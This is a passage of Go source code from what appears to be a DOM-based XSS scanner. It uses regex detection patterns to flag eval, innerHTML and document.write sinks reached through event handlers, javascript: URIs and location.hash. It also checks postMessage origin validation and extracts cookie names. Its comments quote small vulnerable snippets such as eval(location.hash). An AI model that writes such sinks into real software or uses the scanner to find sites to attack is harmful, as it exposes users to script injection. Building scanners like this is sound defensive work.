		// Look for patterns like: onclick="eval(something)" or onload="document.write(data)"
		inlineEventPatterns := []string{
			`onclick\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,           // onclick="eval(...)"
			`onload\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,            // onload="eval(...)"
			`onerror\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,           // onerror="eval(...)"
			`onmouseover\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,       // onmouseover="eval(...)"
			`onsubmit\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,          // onsubmit="eval(...)"
			`onchange\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,          // onchange="eval(...)"
			`onfocus\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,           // onfocus="eval(...)"
			`onblur\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,            // onblur="eval(...)"
			`onclick\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,           // onclick="element.innerHTML=..."
			`onload\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,           // onload="element.innerHTML=..."
			`onerror\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,           // onerror="element.innerHTML=..."
			`onmouseover\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,       // onmouseover="element.innerHTML=..."
			`onsubmit\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,          // onsubmit="element.innerHTML=..."
			`onchange\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,          // onchange="element.innerHTML=..."
			`onfocus\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,           // onfocus="element.innerHTML=..."
			`onblur\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,            // onblur="element.innerHTML=..."
			`onclick\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,     // onclick="document.write(...)"
			`onload\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,      // onload="document.write(...)"
			`onerror\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,     // onerror="document.write(...)"
			`onmouseover\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,  // onmouseover="document.write(...)"
			`onsubmit\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,     // onsubmit="document.write(...)"
			`onchange\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,     // onchange="document.write(...)"
			`onfocus\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,      // onfocus="document.write(...)"
			`onblur\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,       // onblur="document.write(...)"
		}
		
		for _, pattern := range inlineEventPatterns {
			regex := regexp.MustCompile(`(?i)` + pattern)
			if regex.MatchString(body) {
				if strings.Contains(pattern, "eval") {
					return true, "event_triggered", "eval"
				} else if strings.Contains(pattern, "innerHTML") {
					return true, "event_triggered", "innerHTML"
				} else if strings.Contains(pattern, "document.write") {
					return true, "event_triggered", "document.write"
				}
			}
		}
		
		// Pattern 2: addEventListener with dangerous sinks
		// Look for patterns like: addEventListener('click', function() { eval(...) })
		eventListenerPattern := regexp.MustCompile(`(?s)addEventListener\s*\(\s*['"](click|load|error|mouseover|focus|blur|submit|change)['"][\s\S]*?function[^{]*\{[\s\S]*?\}`)
		eventListeners := eventListenerPattern.FindAllString(body, -1)
		
		for _, listener := range eventListeners {
			if hasEval && strings.Contains(listener, "eval(") {
				return true, "event_triggered", "eval"
			}
			if hasInnerHTML && strings.Contains(strings.ToLower(listener), "innerhtml") {
				return true, "event_triggered", "innerHTML"
			}
			if hasDocumentWrite && strings.Contains(listener, "document.write") {
				return true, "event_triggered", "document.write"
			}
		}
		
		// Pattern 3: Event handler function references
		// Look for patterns like: addEventListener('click', handlerFunction)
		eventHandlerRefPattern := regexp.MustCompile(`(?s)addEventListener\s*\(\s*['"](click|load|error|mouseover|focus|blur|submit|change)['"][\s\S]*?(\w+)\s*[,\)]`)
		eventHandlerRefs := eventHandlerRefPattern.FindAllStringSubmatch(body, -1)
		
		for _, match := range eventHandlerRefs {
			if len(match) > 2 {
				handlerName := match[2]
				
				// Look for the handler function definition
				handlerDefPattern := regexp.MustCompile(`(?s)(?:var|let|const|function)\s+` + regexp.QuoteMeta(handlerName) + `\s*[=\s]*function[^{]*\{[\s\S]*?\}`)
				handlerDef := handlerDefPattern.FindString(body)
				if handlerDef != "" {
					if hasEval && strings.Contains(handlerDef, "eval(") {
						return true, "event_triggered", "eval"
					}
					if hasInnerHTML && strings.Contains(strings.ToLower(handlerDef), "innerhtml") {
						return true, "event_triggered", "innerHTML"
					}
					if hasDocumentWrite && strings.Contains(handlerDef, "document.write") {
						return true, "event_triggered", "document.write"
					}
				}
			}
		}
		
		// Pattern 4: Direct event property assignment
		// Look for patterns like: element.onclick = function() { eval(...) }
		eventPropertyPattern := regexp.MustCompile(`(?s)\w+\.on(click|load|error|mouseover|focus|blur|submit|change)\s*=\s*function[^{]*\{[\s\S]*?\}`)
		eventProperties := eventPropertyPattern.FindAllString(body, -1)
		
		for _, property := range eventProperties {
			if hasEval && strings.Contains(property, "eval(") {
				return true, "event_triggered", "eval"
			}
			if hasInnerHTML && strings.Contains(strings.ToLower(property), "innerhtml") {
				return true, "event_triggered", "innerHTML"
			}
			if hasDocumentWrite && strings.Contains(property, "document.write") {
				return true, "event_triggered", "document.write"
			}
		}
		
		// Pattern 5: Event handlers that call functions containing dangerous sinks
		// Look for patterns like: form.onsubmit = function() { someFunction(); }
		// where someFunction contains eval() or other dangerous sinks
		eventFunctionCallPattern := regexp.MustCompile(`(?s)\w+\.on(click|load|error|mouseover|focus|blur|submit|change)\s*=\s*function[^{]*\{[\s\S]*?(\w+)\s*\([^)]*\)[\s\S]*?\}`)
		eventFunctionCalls := eventFunctionCallPattern.FindAllStringSubmatch(body, -1)
		
		for _, match := range eventFunctionCalls {
			if len(match) > 2 {
				functionName := match[2]
				// Look for the function definition
				functionDefPattern := regexp.MustCompile(`(?s)(?:var|let|const|function)\s+` + regexp.QuoteMeta(functionName) + `\s*[=\s]*function[^{]*\{[\s\S]*?\}`)
				functionDef := functionDefPattern.FindString(body)
				if functionDef != "" {
					if hasEval && strings.Contains(functionDef, "eval(") {
						return true, "event_triggered", "eval"
					}
					if hasInnerHTML && strings.Contains(strings.ToLower(functionDef), "innerhtml") {
						return true, "event_triggered", "innerHTML"
					}
					if hasDocumentWrite && strings.Contains(functionDef, "document.write") {
						return true, "event_triggered", "document.write"
					}
				}
			}
		}
		
		// Pattern 6: Simple detection for event handlers with dangerous sinks anywhere in the page
		// This is a fallback for complex patterns that our regex might miss
		if hasEventHandlers && hasEval {
			// Look for any event handler assignment followed by eval usage
			eventAssignmentPattern := regexp.MustCompile(`(?s)\w+\.on(click|load|error|mouseover|focus|blur|submit|change)\s*=`)
			if eventAssignmentPattern.MatchString(body) {
				// If we find event assignments and eval in the same page, it's likely event-triggered XSS
				return true, "event_triggered", "eval"
			}
		}
		
		if hasEventHandlers && hasInnerHTML {
			eventAssignmentPattern := regexp.MustCompile(`(?s)\w+\.on(click|load|error|mouseover|focus|blur|submit|change)\s*=`)
			if eventAssignmentPattern.MatchString(body) {
				return true, "event_triggered", "innerHTML"
			}
		}
		
		if hasEventHandlers && hasDocumentWrite {
			eventAssignmentPattern := regexp.MustCompile(`(?s)\w+\.on(click|load|error|mouseover|focus|blur|submit|change)\s*=`)
			if eventAssignmentPattern.MatchString(body) {
				return true, "event_triggered", "document.write"
			}
		}
	}
	
	// Typing event-triggered XSS patterns
	if hasTypingEvents {
		// Pattern 1: Inline typing event handlers with dangerous sinks
		// Look for patterns like: oninput="eval(something)" or onkeyup="document.write(data)"
		inlineTypingPatterns := []string{
			`oninput\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,           // oninput="eval(...)"
			`onkeyup\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,          // onkeyup="eval(...)"
			`onkeydown\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,        // onkeydown="eval(...)"
			`onkeypress\s*=\s*['"][^'"]*eval\s*\([^'"]*['"]`,       // onkeypress="eval(...)"
			`oninput\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,          // oninput="element.innerHTML=..."
			`onkeyup\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,          // onkeyup="element.innerHTML=..."
			`onkeydown\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,        // onkeydown="element.innerHTML=..."
			`onkeypress\s*=\s*['"][^'"]*innerHTML[^'"]*['"]`,       // onkeypress="element.innerHTML=..."
			`oninput\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,     // oninput="document.write(...)"
			`onkeyup\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,     // onkeyup="document.write(...)"
			`onkeydown\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,   // onkeydown="document.write(...)"
			`onkeypress\s*=\s*['"][^'"]*document\.write[^'"]*['"]`,  // onkeypress="document.write(...)"
		}
		
		for _, pattern := range inlineTypingPatterns {
			regex := regexp.MustCompile(`(?i)` + pattern)
			if regex.MatchString(body) {
				if strings.Contains(pattern, "eval") {
					return true, "typing_event", "eval"
				} else if strings.Contains(pattern, "innerHTML") {
					return true, "typing_event", "innerHTML"
				} else if strings.Contains(pattern, "document.write") {
					return true, "typing_event", "document.write"
				}
			}
		}
		
		// Pattern 2: addEventListener with typing events and dangerous sinks
		// Look for patterns like: addEventListener('input', function() { eval(...) })
		typingListenerPattern := regexp.MustCompile(`(?s)addEventListener\s*\(\s*['"](input|keyup|keydown|keypress)['"][\s\S]*?function[^{]*\{[\s\S]*?\}`)
		typingListeners := typingListenerPattern.FindAllString(body, -1)
		
		for _, listener := range typingListeners {
			if hasEval && strings.Contains(listener, "eval(") {
				return true, "typing_event", "eval"
			}
			if hasInnerHTML && strings.Contains(strings.ToLower(listener), "innerhtml") {
				return true, "typing_event", "innerHTML"
			}
			if hasDocumentWrite && strings.Contains(listener, "document.write") {
				return true, "typing_event", "document.write"
			}
		}
		
		// Pattern 3: Typing event handler function references
		// Look for patterns like: addEventListener('input', handlerFunction)
		typingHandlerRefPattern := regexp.MustCompile(`(?s)addEventListener\s*\(\s*['"](input|keyup|keydown|keypress)['"][\s\S]*?(\w+)\s*[,\)]`)
		typingHandlerRefs := typingHandlerRefPattern.FindAllStringSubmatch(body, -1)
		
		for _, match := range typingHandlerRefs {
			if len(match) > 2 {
				handlerName := match[2]
				// Look for the handler function definition
				handlerDefPattern := regexp.MustCompile(`(?s)(?:var|let|const|function)\s+` + regexp.QuoteMeta(handlerName) + `\s*[=\s]*function[^{]*\{[\s\S]*?\}`)
				handlerDef := handlerDefPattern.FindString(body)
				if handlerDef != "" {
					if hasEval && strings.Contains(handlerDef, "eval(") {
						return true, "typing_event", "eval"
					}
					if hasInnerHTML && strings.Contains(strings.ToLower(handlerDef), "innerhtml") {
						return true, "typing_event", "innerHTML"
					}
					if hasDocumentWrite && strings.Contains(handlerDef, "document.write") {
						return true, "typing_event", "document.write"
					}
				}
			}
		}
		
		// Pattern 4: Direct typing event property assignment
		// Look for patterns like: input.oninput = function() { eval(...) }
		typingPropertyPattern := regexp.MustCompile(`(?s)\w+\.on(input|keyup|keydown|keypress)\s*=\s*function[^{]*\{[\s\S]*?\}`)
		typingProperties := typingPropertyPattern.FindAllString(body, -1)
		
		for _, property := range typingProperties {
			if hasEval && strings.Contains(property, "eval(") {
				return true, "typing_event", "eval"
			}
			if hasInnerHTML && strings.Contains(strings.ToLower(property), "innerhtml") {
				return true, "typing_event", "innerHTML"
			}
			if hasDocumentWrite && strings.Contains(property, "document.write") {
				return true, "typing_event", "document.write"
			}
		}
		
		// Pattern 5: Typing event handlers that call functions containing dangerous sinks
		// Look for patterns like: input.oninput = function() { someFunction(); }
		typingFunctionCallPattern := regexp.MustCompile(`(?s)\w+\.on(input|keyup|keydown|keypress)\s*=\s*function[^{]*\{[\s\S]*?(\w+)\s*\([^)]*\)[\s\S]*?\}`)
		typingFunctionCalls := typingFunctionCallPattern.FindAllStringSubmatch(body, -1)
		
		for _, match := range typingFunctionCalls {
			if len(match) > 2 {
				functionName := match[2]
				// Look for the function definition
				functionDefPattern := regexp.MustCompile(`(?s)(?:var|let|const|function)\s+` + regexp.QuoteMeta(functionName) + `\s*[=\s]*function[^{]*\{[\s\S]*?\}`)
				functionDef := functionDefPattern.FindString(body)
				if functionDef != "" {
					if hasEval && strings.Contains(functionDef, "eval(") {
						return true, "typing_event", "eval"
					}
					if hasInnerHTML && strings.Contains(strings.ToLower(functionDef), "innerhtml") {
						return true, "typing_event", "innerHTML"
					}
					if hasDocumentWrite && strings.Contains(functionDef, "document.write") {
						return true, "typing_event", "document.write"
					}
				}
			}
		}
		
		// Pattern 6: Simple detection for typing event handlers with dangerous sinks anywhere in the page
		// This is a fallback for complex patterns that our regex might miss
		if hasTypingEvents && hasEval {
			// Look for any typing event handler assignment followed by eval usage
			typingAssignmentPattern := regexp.MustCompile(`(?s)\w+\.on(input|keyup|keydown|keypress)\s*=`)
			if typingAssignmentPattern.MatchString(body) {
				// If we find typing event assignments and eval in the same page, it's likely typing event-triggered XSS
				return true, "typing_event", "eval"
			}
		}
		
		if hasTypingEvents && hasInnerHTML {
			typingAssignmentPattern := regexp.MustCompile(`(?s)\w+\.on(input|keyup|keydown|keypress)\s*=`)
			if typingAssignmentPattern.MatchString(body) {
				return true, "typing_event", "innerHTML"
			}
		}
		
		if hasTypingEvents && hasDocumentWrite {
			typingAssignmentPattern := regexp.MustCompile(`(?s)\w+\.on(input|keyup|keydown|keypress)\s*=`)
			if typingAssignmentPattern.MatchString(body) {
				return true, "typing_event", "document.write"
			}
		}
	}
	
	// JavaScript URI DOM XSS patterns
	if hasJavaScriptURI {
		// Pattern 0: href attribute with javascript: URI (most common case)
		// Look for patterns like: <a href="javascript:location.href=location.href">
		hrefJavaScriptPattern := regexp.MustCompile(`(?i)href\s*=\s*['"](?:javascript:)?[^'"]*['"]`)
		if hrefJavaScriptPattern.MatchString(body) {
			// Extract javascript: URIs from href attributes
			javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
			javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
			
			for _, uri := range javascriptURIs {
				uriLower := strings.ToLower(uri)
				// Check for dangerous operations or location assignments
				if strings.Contains(uriLower, "document.write") || 
				   strings.Contains(uriLower, "innerhtml") || 
				   strings.Contains(uriLower, "outerhtml") ||
				   strings.Contains(uriLower, "eval(") ||
				   strings.Contains(uriLower, "location.href") ||
				   strings.Contains(uriLower, "window.location") {
					return true, "javascript_uri", "location.href"
				}
			}
		}
		
		// Pattern 1: Direct location.href assignment with javascript: URI
		// Look for patterns like: location.href = "javascript:document.write(userInput)"
		locationHrefPattern := regexp.MustCompile(`(?i)location\.href\s*=\s*['"](?:javascript:)?[^'"]*['"]`)
		if locationHrefPattern.MatchString(body) {
			// Check if it contains dangerous operations
			if strings.Contains(strings.ToLower(body), "javascript:") {
				// Look for document.write, innerHTML, or other dangerous sinks in javascript: URIs
				javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
				javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
				
				for _, uri := range javascriptURIs {
					uriLower := strings.ToLower(uri)
					if strings.Contains(uriLower, "document.write") || 
					   strings.Contains(uriLower, "innerhtml") || 
					   strings.Contains(uriLower, "outerhtml") ||
					   strings.Contains(uriLower, "eval(") {
						return true, "javascript_uri", "location.href"
					}
				}
			}
		}
		
		// Pattern 2: window.location.href assignment with javascript: URI
		// Look for patterns like: window.location.href = "javascript:alert(1)"
		windowLocationPattern := regexp.MustCompile(`(?i)window\.location\.href\s*=\s*['"](?:javascript:)?[^'"]*['"]`)
		if windowLocationPattern.MatchString(body) {
			if strings.Contains(strings.ToLower(body), "javascript:") {
				javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
				javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
				
				for _, uri := range javascriptURIs {
					uriLower := strings.ToLower(uri)
					if strings.Contains(uriLower, "document.write") || 
					   strings.Contains(uriLower, "innerhtml") || 
					   strings.Contains(uriLower, "outerhtml") ||
					   strings.Contains(uriLower, "eval(") {
						return true, "javascript_uri", "location.href"
					}
				}
			}
		}
		
		// Pattern 3: location assignment with javascript: URI
		// Look for patterns like: location = "javascript:document.write(data)"
		locationPattern := regexp.MustCompile(`(?i)location\s*=\s*['"](?:javascript:)?[^'"]*['"]`)
		if locationPattern.MatchString(body) {
			if strings.Contains(strings.ToLower(body), "javascript:") {
				javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
				javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
				
				for _, uri := range javascriptURIs {
					uriLower := strings.ToLower(uri)
					if strings.Contains(uriLower, "document.write") || 
					   strings.Contains(uriLower, "innerhtml") || 
					   strings.Contains(uriLower, "outerhtml") ||
					   strings.Contains(uriLower, "eval(") {
						return true, "javascript_uri", "location.href"
					}
				}
			}
		}
		
		// Pattern 4: Variable assignment to location.href with javascript: URI
		// Look for patterns like: var url = "javascript:document.write(userInput)"; location.href = url;
		locationVarPattern := regexp.MustCompile(`(?i)(?:var|let|const)\s+\w+\s*=\s*['"](?:javascript:)?[^'"]*['"]`)
		if locationVarPattern.MatchString(body) {
			if strings.Contains(strings.ToLower(body), "javascript:") {
				// Check if the variable is later assigned to location.href
				locationAssignmentPattern := regexp.MustCompile(`(?i)location\.href\s*=\s*\w+`)
				if locationAssignmentPattern.MatchString(body) {
					javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
					javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
					
					for _, uri := range javascriptURIs {
						uriLower := strings.ToLower(uri)
						if strings.Contains(uriLower, "document.write") || 
						   strings.Contains(uriLower, "innerhtml") || 
						   strings.Contains(uriLower, "outerhtml") ||
						   strings.Contains(uriLower, "eval(") {
							return true, "javascript_uri", "location.href"
						}
					}
				}
			}
		}
		
		// Pattern 5: Function calls that set location.href with javascript: URI
		// Look for patterns like: setLocation("javascript:document.write(data)")
		locationFunctionPattern := regexp.MustCompile(`(?i)\w+\s*\(\s*['"](?:javascript:)?[^'"]*['"]\s*\)`)
		if locationFunctionPattern.MatchString(body) {
			if strings.Contains(strings.ToLower(body), "javascript:") {
				// Check if the function name suggests location setting
				functionNames := []string{"setlocation", "redirect", "navigate", "goto", "load"}
				for _, funcName := range functionNames {
					if strings.Contains(strings.ToLower(body), funcName) {
						javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
						javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
						
						for _, uri := range javascriptURIs {
							uriLower := strings.ToLower(uri)
							if strings.Contains(uriLower, "document.write") || 
							   strings.Contains(uriLower, "innerhtml") || 
							   strings.Contains(uriLower, "outerhtml") ||
							   strings.Contains(uriLower, "eval(") {
								return true, "javascript_uri", "location.href"
							}
						}
						break
					}
				}
			}
		}
		
		// Pattern 6: Simple detection for javascript: URIs with dangerous operations
		// This is a fallback for complex patterns that our regex might miss
		if strings.Contains(strings.ToLower(body), "javascript:") {
			javascriptURIPattern := regexp.MustCompile(`(?i)javascript:\s*[^'"]*`)
			javascriptURIs := javascriptURIPattern.FindAllString(body, -1)
			
			for _, uri := range javascriptURIs {
				uriLower := strings.ToLower(uri)
				if strings.Contains(uriLower, "document.write") || 
				   strings.Contains(uriLower, "innerhtml") || 
				   strings.Contains(uriLower, "outerhtml") ||
				   strings.Contains(uriLower, "eval(") {
					// Check if there's any location assignment in the same page
					if strings.Contains(strings.ToLower(body), "location.href") || 
					   strings.Contains(strings.ToLower(body), "window.location") ||
					   strings.Contains(strings.ToLower(body), "location =") {
						return true, "javascript_uri", "location.href"
					}
				}
			}
		}
	}
	
	// Location.hash DOM XSS patterns
	// Pattern 1: Direct eval(location.hash) or eval(location.hash.substr(1))
	hashEvalPattern := regexp.MustCompile(`eval\s*\(\s*[^)]*location\.hash[^)]*\)`)
	if hashEvalPattern.MatchString(body) {
		return true, "location.hash", "eval"
	}
	
	// Pattern 2: Variable assignment from location.hash then eval()
	// Look for: var payload = location.hash.substr(1); eval(payload)
	hashAssignmentPattern := regexp.MustCompile(`location\.hash`)
	if hashAssignmentPattern.MatchString(body) && evalPattern.MatchString(body) {
		return true, "location.hash", "eval"
	}
	
	// Pattern 3: location.hash with innerHTML/outerHTML/document.write
	if hashAssignmentPattern.MatchString(body) && innerHTMLPattern.MatchString(body) {
		return true, "location.hash", "innerHTML"
	}
	if hashAssignmentPattern.MatchString(body) && outerHTMLPattern.MatchString(body) {
		return true, "location.hash", "outerHTML"
	}
	if hashAssignmentPattern.MatchString(body) && documentWritePattern.MatchString(body) {
		return true, "location.hash", "document.write"
	}
	
	// Pattern 4: Complex flows like location.hash -> window.status -> eval
	// Look for patterns where location.hash is assigned to window.status or other properties
	windowStatusPattern := regexp.MustCompile(`window\.status\s*=`)
	if hashAssignmentPattern.MatchString(body) && windowStatusPattern.MatchString(body) && evalPattern.MatchString(body) {
		return true, "location.hash", "eval"
	}
	
	// Pattern 5: location.hash with substr/substring operations
	hashSubstrPattern := regexp.MustCompile(`location\.hash\.(substr|substring)`)
	if hashSubstrPattern.MatchString(body) && evalPattern.MatchString(body) {
		return true, "location.hash", "eval"
	}
	
	return false, "", ""
}

// hasImproperOriginValidation checks for common improper origin validation patterns
func (s *Scanner) hasImproperOriginValidation(listener string) bool {
	// Pattern 1: Partial string comparison (accepts www.google.com.malicious.com)
	// Look for patterns like: origin.includes('google.com') or origin.indexOf('google.com') >= 0
	partialMatchPattern := regexp.MustCompile(`origin\s*\.(includes|indexOf|startsWith)\s*\([^)]*['"][^'"]*['"]`)
	if partialMatchPattern.MatchString(listener) {
		return true
	}
	
	// Pattern 2: Insecure regular expression (no backslash of dots and no end of string enforcement)
	// Look for patterns like: /google\.com/ or /google.com/ without proper escaping or $ anchor
	unsafeRegexPattern := regexp.MustCompile(`\/[^\/]*[^\\]\.com[^\/]*\/`)
	if unsafeRegexPattern.MatchString(listener) {
		return true
	}
	
	// Pattern 3: Missing $ anchor in regex (allows subdomain attacks)
	// Look for patterns like: /^https:\/\/google\.com/ without $ at the end
	missingAnchorPattern := regexp.MustCompile(`\/\^[^\/]*\.com[^\/]*\/[^$]`)
	if missingAnchorPattern.MatchString(listener) {
		return true
	}
	
	// Pattern 4: Using == or === with partial domain matching
	// Look for patterns like: origin == 'google.com' (should be full origin)
	partialEqualityPattern := regexp.MustCompile(`origin\s*[=!]=\s*['"][^'"]*\.com['"]`)
	if partialEqualityPattern.MatchString(listener) {
		return true
	}
	
	return false
}

// checkPostMessageHandler checks if a postMessage handler has dangerous sinks and improper validation
func (s *Scanner) checkPostMessageHandler(handler string, hasEval, hasInnerHTML, hasDocumentWrite bool) bool {
	// Check for improper origin validation patterns
	hasOriginCheck := strings.Contains(handler, "origin") || strings.Contains(handler, "data.origin")
	
	// Check for dangerous sinks within the message handler
	if hasEval && strings.Contains(handler, "eval(") {
		// Check if there's any origin validation
		if !hasOriginCheck {
			return true
		}
		// Check for improper origin validation patterns
		if s.hasImproperOriginValidation(handler) {
			return true
		}
	}
	
	if hasInnerHTML && strings.Contains(strings.ToLower(handler), "innerhtml") {
		if !hasOriginCheck {
			return true
		}
		if s.hasImproperOriginValidation(handler) {
			return true
		}
	}
	
	if hasDocumentWrite && strings.Contains(handler, "document.write") {
		if !hasOriginCheck {
			return true
		}
		if s.hasImproperOriginValidation(handler) {
			return true
		}
	}
	
	return false
}

// getPostMessageSinkType determines the sink type for postMessage vulnerabilities
func (s *Scanner) getPostMessageSinkType(handler string, hasEval, hasInnerHTML, hasDocumentWrite bool) string {
	if hasEval && strings.Contains(handler, "eval(") {
		return "eval"
	}
	if hasInnerHTML && strings.Contains(strings.ToLower(handler), "innerhtml") {
		return "innerHTML"
	}
	if hasDocumentWrite && strings.Contains(handler, "document.write") {
		return "document.write"
	}
	return "complex_message"
}

// extractCookieNamesFromJS dynamically extracts cookie names from JavaScript code
func (s *Scanner) extractCookieNamesFromJS(body string) []string {
	var cookieNames []string
	
	// Pattern 1: lookupCookie('cookieName') or lookupCookie("cookieName")
	lookupPattern := regexp.MustCompile(`lookupCookie\s*\(\s*['"]([^'"]+)['"]`)
	matches := lookupPattern.FindAllStringSubmatch(body, -1)
	for _, match := range matches {
		if len(match) > 1 {
			cookieNames = append(cookieNames, match[1])
		}
	}
	
	// Pattern 2: document.cookie = 'cookieName=value'
	cookieSetPattern := regexp.MustCompile(`document\.cookie\s*=\s*['"]([^=;]+)=`)
	matches = cookieSetPattern.FindAllStringSubmatch(body, -1)
	for _, match := range matches {
		if len(match) > 1 {
			cookieNames = append(cookieNames, match[1])
		}
	}
	
	// Pattern 3: getCookie('cookieName') or similar functions
	getCookiePattern := regexp.MustCompile(`getCookie\s*\(\s*['"]([^'"]+)['"]`)
	matches = getCookiePattern.FindAllStringSubmatch(body, -1)
	for _, match := range matches {
		if len(match) > 1 {
			cookieNames = append(cookieNames, match[1])
		}
	}
	
	// Pattern 4: Variable assignments like var cookieName = getCookie('name')
	varPattern := regexp.MustCompile(`var\s+(\w+)\s*=.*cookie|let\s+(\w+)\s*=.*cookie|const\s+(\w+)\s*=.*cookie`)
	matches = varPattern.FindAllStringSubmatch(body, -1)
	for _, match := range matches {
		if len(match) > 1 && match[1] != "" {
			cookieNames = append(cookieNames, match[1])
		}
		if len(match) > 2 && match[2] != "" {
			cookieNames = append(cookieNames, match[2])
		}
		if len(match) > 3 && match[3] != "" {
			cookieNames = append(cookieNames, match[3])
		}
	}
	
	// Remove duplicates
	seen := make(map[string]bool)
	var uniqueNames []string
	for _, name := range cookieNames {
		if !seen[name] {
			seen[name] = true
			uniqueNames = append(uniqueNames, name)
		}
	}
	
	return uniqueNames
}

// Close cleans up resources
func (s *Scanner) Close() error {
	if s.headless != nil {
		return s.headless.Close()
	}
	return nil
}

